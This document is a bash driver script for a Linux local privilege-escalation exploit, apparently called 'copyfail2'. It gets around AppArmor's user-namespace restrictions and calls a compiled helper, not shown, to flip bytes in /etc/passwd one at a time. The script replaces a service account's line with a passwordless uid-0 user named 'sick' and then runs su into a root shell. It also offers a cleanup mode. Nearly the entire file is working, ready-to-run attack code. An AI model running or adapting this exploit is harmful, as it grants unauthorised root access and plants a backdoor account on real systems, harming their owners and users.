#!/bin/bash
# copyfail2 — adds a passwordless uid-0 user "sick" to /etc/passwd and
# drops you into its shell. No SUID helper, no auto-restore.
#
# Overwrites a system /etc/passwd line (mail/games/etc, longest line
# with a nologin/false shell) with `sick::0:0:<pad>:/:/bin/bash` —
# length-matched, valid 7-field entry, empty password field. PAM
# pam_unix.so nullok accepts empty input password.
#
# Usage:
#   ./run.sh           install + drop into root shell
#   ./run.sh --clean   undo the install (revert /etc/passwd via the same primitive)

set -u
HERE=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
STATE=/var/tmp/.cf2.state
NEW_USER=sick
PREFIX="${NEW_USER}::0:0:"
SUFFIX=":/:/bin/bash"

red()   { printf '\033[31m%s\033[0m\n' "$*" >&2; }
green() { printf '\033[32m%s\033[0m\n' "$*"; }
blue()  { printf '\033[34m=== %s\033[0m\n' "$*"; }

# Userns harness — try plain unshare first, fall back to aa-rootns.
# Probe must actually grant CAP_NET_ADMIN (Ubuntu apparmor_restrict_unprivileged_userns
# strips caps but `unshare` itself still returns 0).
setup_usns() {
    if unshare -U -r -n -- /bin/sh -c 'ip link add type dummy 2>/dev/null && ip link del dev dummy0 2>/dev/null' 2>/dev/null; then
        USNS=(unshare -U -r -n --)
        return
    fi
    if [ -n "${AAR:-}" ] && [ -x "$AAR" ]; then
        USNS=("$AAR" -n --); return
    fi
    if command -v aa-rootns >/dev/null 2>&1; then
        USNS=("$(command -v aa-rootns)" -n --); return
    fi
    if [ ! -x "$HERE/aa-rootns" ] && [ -f "$HERE/aa-rootns.c" ]; then
        gcc -O2 -Wall "$HERE/aa-rootns.c" -o "$HERE/aa-rootns" \
            || { red "build aa-rootns failed"; exit 1; }
    fi
    if [ -x "$HERE/aa-rootns" ]; then
        USNS=("$HERE/aa-rootns" -n --); return
    fi
    red "no usable userns harness — install aa-rootns or set apparmor_restrict_unprivileged_userns=0"
    exit 1
}

build_helper() {
    [ -x "$HERE/copyfail2" ] || gcc -O2 -Wall "$HERE/copyfail2.c" -o "$HERE/copyfail2" -lcrypto \
        || { red "build copyfail2 failed (need libssl-dev)"; exit 1; }
}

flip_range() {
    # $1 = LINE_OFF, $2 = source string (current bytes), $3 = target string
    local line_off=$1 src=$2 dst=$3 len=${#2}
    local i o t off
    declare -ag FLIPS=()
    for ((i=0; i<len; i++)); do
        o="${src:$i:1}"
        t="${dst:$i:1}"
        if [ "$o" != "$t" ]; then
            FLIPS+=("$((line_off + i)):$(printf '0x%02x' "'$t")")
        fi
    done
    for f in "${FLIPS[@]}"; do
        off=${f%:*} ; t=${f#*:}
        "${USNS[@]}" "$HERE/copyfail2" /etc/passwd "$off" "$t" >/dev/null
    done
}

# ---------- --clean ----------
if [ "${1:-}" = "--clean" ] || [ "${1:-}" = "-c" ]; then
    [ -r "$STATE" ] || { red "no state file at $STATE — nothing to clean (or run as the same user that installed)"; exit 1; }
    # shellcheck disable=SC1090
    . "$STATE"
    : "${LINE_OFF:?missing LINE_OFF in state}" "${VICTIM_LINE:?missing VICTIM_LINE in state}"
    VICTIM_LEN=${#VICTIM_LINE}

    setup_usns
    build_helper

    CURRENT=$(dd if=/etc/passwd bs=1 skip="$LINE_OFF" count="$VICTIM_LEN" 2>/dev/null)
    if [ "$CURRENT" = "$VICTIM_LINE" ]; then
        green "[+] /etc/passwd already matches original — clearing state file"
        rm -f "$STATE"
        exit 0
    fi

    # Compute flips
    declare -a CFLIPS=()
    for ((i=0; i<VICTIM_LEN; i++)); do
        o="${CURRENT:$i:1}"
        t="${VICTIM_LINE:$i:1}"
        [ "$o" != "$t" ] && CFLIPS+=("$((LINE_OFF + i)):$(printf '0x%02x' "'$t")")
    done

    blue "Cleanup — revert ${#CFLIPS[@]} bytes at offset $LINE_OFF back to '${VICTIM_LINE%%:*}' line"
    for f in "${CFLIPS[@]}"; do
        off=${f%:*} ; t=${f#*:}
        "${USNS[@]}" "$HERE/copyfail2" /etc/passwd "$off" "$t" >/dev/null
    done

    if grep -q "^${NEW_USER}::0:0:" /etc/passwd; then
        red "sick line still present — clean failed"
        exit 1
    fi
    NEW=$(dd if=/etc/passwd bs=1 skip="$LINE_OFF" count="$VICTIM_LEN" 2>/dev/null)
    if [ "$NEW" != "$VICTIM_LINE" ]; then
        red "post-clean line mismatch — manual fix required"
        echo "expected: $VICTIM_LINE"
        echo "got:      $NEW"
        exit 1
    fi

    rm -f "$STATE"
    green "[+] cleaned — '${VICTIM_LINE%%:*}' line restored, state file removed"
    exit 0
fi

# ---------- default: install ----------
if [ "${1:-}" = "--help" ] || [ "${1:-}" = "-h" ]; then
    sed -n '2,12p' "$0"
    exit 0
fi

# Already installed? Just su.
if getent passwd "$NEW_USER" | grep -q "^${NEW_USER}::0:0:"; then
    green "[+] '$NEW_USER' already in /etc/passwd"
    exec su - "$NEW_USER"
fi

setup_usns
build_helper

getent passwd "$NEW_USER" >/dev/null \
    && { red "'$NEW_USER' already exists in passwd with non-uid-0 entry — pick a different NEW_USER"; exit 1; }

# Pick the longest /etc/passwd line whose shell is nologin/false/sync.
VICTIM_LINE=$(awk -F: '
    $NF == "/usr/sbin/nologin" || $NF == "/sbin/nologin" ||
    $NF == "/bin/false" || $NF == "/usr/bin/false" || $NF == "/bin/sync" {
        if (length($0) > maxlen) { maxlen = length($0); maxline = $0 }
    }
    END { print maxline }
' /etc/passwd)
[ -n "$VICTIM_LINE" ] || { red "no victim line found in /etc/passwd"; exit 1; }
VICTIM_NAME=${VICTIM_LINE%%:*}
VICTIM_LEN=${#VICTIM_LINE}

PAD_LEN=$((VICTIM_LEN - ${#PREFIX} - ${#SUFFIX}))
[ "$PAD_LEN" -ge 0 ] \
    || { red "victim '$VICTIM_NAME' line too short ($VICTIM_LEN chars)"; exit 1; }
PAD=$(printf '%*s' "$PAD_LEN" '' | tr ' ' 'X')
TARGET_LINE="${PREFIX}${PAD}${SUFFIX}"

LINE_OFF=$(grep -nob "^$VICTIM_NAME:" /etc/passwd | head -1 | cut -d: -f2)

# Persist state for --clean before we mutate
umask 077
{
    echo "LINE_OFF=$LINE_OFF"
    printf 'VICTIM_LINE=%q\n' "$VICTIM_LINE"
} > "$STATE"

blue "Stage 1 — overwrite '$VICTIM_NAME' line ($VICTIM_LEN bytes) with '$NEW_USER::0:0:<pad>:/:/bin/bash'"
flip_range "$LINE_OFF" "$VICTIM_LINE" "$TARGET_LINE"

blue "Stage 2 — verify"
grep "^$NEW_USER:" /etc/passwd || { red "mutation didn't land"; exit 1; }

blue "Stage 3 — su - $NEW_USER (empty password via PAM nullok)"
green "[i] state saved to $STATE — run './run.sh --clean' to revert"
exec su - "$NEW_USER"
